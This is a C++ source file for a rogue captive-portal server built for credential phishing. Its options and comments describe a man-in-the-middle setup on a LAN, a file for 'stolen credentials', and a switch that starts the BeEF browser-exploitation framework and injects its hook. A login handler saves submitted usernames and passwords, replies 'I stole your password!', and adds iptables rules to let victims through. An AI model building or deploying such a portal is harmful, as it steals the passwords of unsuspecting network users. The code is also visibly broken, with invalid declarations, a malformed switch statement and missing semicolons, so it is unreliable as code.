#include <boost/program_options.hpp>
#include <boost/algorithm/string.hpp>
#include <boost/network/uri.hpp>
#include <httpserver.hpp>
#include "everythingelse.hpp"

//currently refactoring to include ncurses and a menu and all sorts of goodies in a menu system
// I learned this and coded it in 18 hours total without youtube, udemy, or any tutorial..

// I used : google, stackexchange, official reference documentation, code examples.

//g++ ./main.cpp ./auth.cpp ./curses.cpp ./extra_functions.cpp -o ./main.o -L/usr/include/boost/program_options.hpp -lboost_program_options -lboost_system -lboost_filesystem -lhttpserver -lpthread -lcurses -lopenssl

// reemember, if youre getting library errors, you might need to check the linker options
// if youre getting syntax errors, you might want to check the code,
//sometimes one SMALL error can fuck EVERYTHING up, be aware and keep an open mind.

using namespace std;
using namespace httpserver;

namespace filesystem = boost::filesystem;
namespace options    = boost::program_options;
namespace url_parse  = boost::network::uri;
int row = 0, col = 0;
int init_display_height;
int init_display_width;
bool hook;
bool PORTAL;
int PORT;
bool curses  == true;
std::string  credentials_file;
//std::vector[] username_password_pair;
//std::string username_password_array[];

std::string document_root;
std::vector<string> hostslist;
std::string hook_location;
std::string redirect_ip;
std::string remote_ip;
std::string beef_hook;
std::string addr;
std::string iface;

int parse_commandline(int argc, char* argv[]){
    options::options_description desc("Captive portal server");
    desc.add_options()
        ("help,h", "Print Help Message" )
        ("address,a", options::value<std::string >()->default_value("192.168.0.1"), "IP address to use (this is the router on the LAN, Were doing an MITM!)" )
        ("port,p", options::value<int>()->default_value(80), "port to serve the portal on")
        ("Iface,i", options::value< std::string >()->default_value("eth0"), "Interface to use, must be capable of monitor mode." )
        ("credentials,c", options::value<std::string>()->default_value("credentials.txt"), "Filename to save the stolen credentials to")
        ("document-root,d", options::value<std::string>()->default_value("/"), "Document root of the server ")
        ("external-html,e","switch for serving external document instead of internal form")
        ("curses", "Interactive curses interface, lets you pretend you're a hacker")
        ("beef-hook,b", "Trigger for beef" )
        ("portal,c", "Trigger to actually implement the redirect" )

    ;
    options::variables_map arguments;
    options::store(options::parse_command_line(argc , argv, desc), arguments);
    try {
        options::notify(arguments);
    } catch (std::exception& e) {
        auto errortext = e.what();
        errprint(errortext);
        return 1;
    };
    if (arguments.count("help")) {
        cout << desc << "\n";
        return 1;
    };
    if (arguments.count("portal")) {
        PORTAL = true;
    };
    if (arguments.count("beef-hook")) {
        hook_location = arguments["address"].as<std::string>();
        hook_location = hook_location + ":3000";
        system("service beef start");
    } else {
        hook_location = "";
    };
    if (arguments.count("external-html")) {
        //auto pwd = filesystem::current_path();
        //document_root = pwd + arguments
    };

    document_root = arguments["document-root"].as<std::string>();
    credentials_file = arguments["credentials"].as<std::string>();
    PORT = arguments["port"].as<int>();
    redirect_ip =  arguments["address"].as<std::string>() + "/login";
    addr = arguments["address"].as<std::string>();
};

/**
HTML responder resource dictating the behavior of the redirect thereby establshing this as a
captive portal. it has to redirect all unauthenticated requests to the /login resource for auth

usually, the expected behavior is to issue a GET request to document_root, which is what this class
responds to with a string containing redirect HTML.

typically, you need to MITM to get the GET or, legally, be the owner of the network. This class doesn't care

*/
class CaptivePortal : public http_resource {
public:
    const std::shared_ptr<http_response> render_GET(const http_request& request) {
        if (curses == true) {
            std::string message("redirecting %remoteip to portal", request.get_requestor())
            update_window(stdscr, message)
        } else if (curses == false) {
            termcolorprint("yellow", ("redirecting %remoteip to portal", request.get_requestor()));
        }
        return std::shared_ptr<http_response>(new string_response(html_redirect_body));
    };
};

/**
HTML responder resource dictating the behavior of the /login

*/
class Login : public http_resource {
public:
    const std::shared_ptr<http_response> render_GET(const http_request& request) {
        std::string html_form_body = make_html(hook_location, addr, true);
        return std::shared_ptr<http_response>(new string_response(html_form_body));

    };
    const std::shared_ptr<http_response> render_POST(const http_request& request) {
        remote_ip = request.get_requestor();
        termcolorprint("green", ("Host %host Authorized", remote_ip));
        save_credentials(request.get_user(), request.get_pass());
        return std::shared_ptr<http_response>(new string_response("you may now browse freely, I stole your password!"));
    };
    void authpassthrough(std::string remoteip){
        system(("iptables -t nat -I PREROUTING 1 -s $remoteip -j ACCEPT", remoteip).c_str());
        system(("iptables -I FORWARD -s %remoteip-j ACCEPT", remoteip).c_str());
    };

    int save_credentials(std::string username, std::string password){
        try {
            std::string name = username;
            std::string pass = password;
            auto pwd = filesystem::current_path().string();
            std::string file = pwd + credentials_file;
            std::ofstream credentials(file);
            std::string data(name + " : " + pass + "\n");
            credentials << data;
            return 0;
        } catch (std::exception& e) {
            auto errortext = e.what();
            errprint(errortext);
            return 1;
        };
    };
};

/**
returns a string containing the html needed to make wither a redirect or form with
 beefhook location and formaction as the first and second parameters respectively.
 both strings;
 @param power_switch turns the server on or off
 @param PORTAL turns he portal on or off

*/
void start_stop_server(bool power_switch, bool ){
    case (power_switch) {
        switch true :
            webserver server = create_webserver(PORT);
            if (PORTAL == true){
                CaptivePortal captiveportal;
                Login login;
                server.register_resource(document_root, &captiveportal);
                server.register_resource("/login", &login);
                server.start(true);
            } else if (PORTAL == false) {
                Login login;
                //server.register_resource(document_root, &captiveportal);
                server.register_resource("/login", &login);
                server.start(true);
            };
        switch false:
            shutdown_server();
    };

};

int main(int argc, char* argv[]) {

    try {
        initscr();
        if (stdscr == NULL ) {
            printf("ERROR: init() failed");
        };
    } catch (std::exception& e) {
        auto errortext = e.what();
        printf(errortext);
        return 1;
        };
    //wmove(stdscr, 50,50);
    cbreak();
    nodelay(stdscr, true);
    getmaxyx(stdscr, init_display_height, init_display_width);
    start_color();
    keypad(stdscr, TRUE);
    refresh();
    fflush(stdin);
    scrollok(stdscr, true);
    //output_window = newpad(2046, init_display_width);
    wprintw(stdscr, "test");

    //scrollok(output_window, true);
    //input_window = subwin(main_window , 1, init_display_width , LINES -1, 0);
    //touchwin(output_window);
    //wmove(input_window, LINES -1, 0);
    //wbkgd(output_window, COLOR_PAIR(1));
    signal(SIGWINCH, resizehandler);
    while(1)
    {
        get_command();
    };
    endwin();
    };

















